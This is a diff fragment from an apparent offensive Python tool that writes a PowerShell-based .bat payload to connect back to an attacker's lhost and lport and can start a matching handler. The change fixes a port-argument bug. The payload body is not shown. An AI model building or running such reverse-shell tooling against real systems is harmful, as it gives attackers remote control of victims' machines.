@@ -14,9 +14,9 @@ def main():
     parser.add_argument("--no-syswow64", action='store_true', help="disable usage of syswow64 powershell in payload")
     args = parser.parse_args()
     outputPath = Path(f"{args.output}.bat")
-    createFinalPayload(outputPath, args.lhost, args.port, no_syswow64=args.no_syswow64, no_noexit=args.no_noexit)
+    createFinalPayload(outputPath, args.lhost, args.lport, no_syswow64=args.no_syswow64, no_noexit=args.no_noexit)
     if args.handler:
-        startHandler(args.lhost, args.port)
+        startHandler(args.lhost, args.lport)
 
 def createFinalPayload(outputPath, lhost, lport, no_syswow64=False, no_noexit=False):
     print(f"[+] generating payload for {lhost}:{lport}")
